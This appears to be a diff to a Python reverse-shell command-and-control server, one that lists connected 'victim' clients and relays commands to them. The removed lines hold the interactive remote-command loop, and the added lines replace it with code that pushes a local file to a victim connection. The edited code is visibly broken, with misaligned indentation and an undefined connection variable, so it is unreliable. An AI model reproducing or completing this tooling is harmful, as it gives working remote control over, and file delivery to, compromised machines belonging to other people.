@@ -4,8 +4,8 @@ import threading
 import time
 from queue import Queue
 
-NUMBER_OF_THREADS = 2
-JOB_NUMBER = [1, 2]
+NUMBER_OF_THREADS = 5
+JOB_NUMBER = [1, 6]
 queue = Queue()
 all_connections = []
 all_address = []
@@ -78,16 +78,16 @@ def accepting_connections():
 def start_turtle():
 
     while True:
-        cmd = input('turtle> ')
-        if cmd == 'list':
-            list_connections()
-        elif 'select' in cmd:
-            conn = get_target(cmd)
-            if conn is not None:
-                send_target_commands(conn)
+#        cmd = input('turtle> ')
+#        if cmd == 'list':
+         list_connections()
+#        elif 'select' in cmd:
+#            conn = get_target(cmd)
+#            if conn is not None:
+         send_target_commands(conn)
 
-        else:
-            print("Command not recognized")
+#        else:
+#            print("Command not recognized")
 
 
 # Display all current active connections with client
@@ -104,42 +104,51 @@ def list_connections():
             del all_address[i]
             continue
 
-        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) + "\n"
+        results = str(i) + "   " + str(all_address[i][0]) + "   " + str(all_address[i][1]) +  "   " + str(all_address[i][2]) + "   " + str(all_address[i][3]) +"   " + str(all_address[i][4]) + "\n"
 
     print("----Clients----" + "\n" + results)
 
 
 # Selecting the target
-def get_target(cmd):
-    try:
-        target = cmd.replace('select ', '')  # target = id
-        target = int(target)
-        conn = all_connections[target]
-        print("You are now connected to :" + str(all_address[target][0]))
-        print(str(all_address[target][0]) + ">", end="")
-        return conn
-        # 192.168.0.4> dir
+#def get_target(cmd):
+#    try:
+#        target = cmd.replace('select ', '')  # target = id
+#        target = int(target)
+#        conn = all_connections[target]
+#        print("You are now connected to :" + str(all_address[target][0]))
+#        print(str(all_address[target][0]) + ">", end="")
+#        return conn
+#        # 192.168.0.4> dir
 
-    except:
-        print("Selection not valid")
-        return None
+#    except:
+#        print("Selection not valid")
+#        return None
 
 
 # Send commands to client/victim or a friend
 def send_target_commands(conn):
-    while True:
-        try:
-            cmd = input()
-            if cmd == 'quit':
-                break
-            if len(str.encode(cmd)) > 0:
-                conn.send(str.encode(cmd))
-                client_response = str(conn.recv(20480), "utf-8")
-                print(client_response, end="")
-        except:
-            print("Error sending commands")
-            break
+#    while True:
+#        try:
+#            cmd = input()
+#            if cmd == 'quit':
+#                break
+#            if len(str.encode(cmd)) > 0:
+#                conn.send(str.encode(cmd))
+#                client_response = str(conn.recv(20480), "utf-8")
+#                print(client_response, end="")
+#        except:
+#            print("Error sending commands")
+#            break
+filename='test.txt' #In the same folder or path is this file running must the file you want to tranfser to be
+    f = open(filename,'rb')
+    l = f.read(1024)
+    while (l):
+       conn.send(l)
+       print('Sent ',repr(l))
+       l = f.read(1024)
+    f.close()
 
+    print('Done sending')
 
 # Create worker threads
 def create_workers():
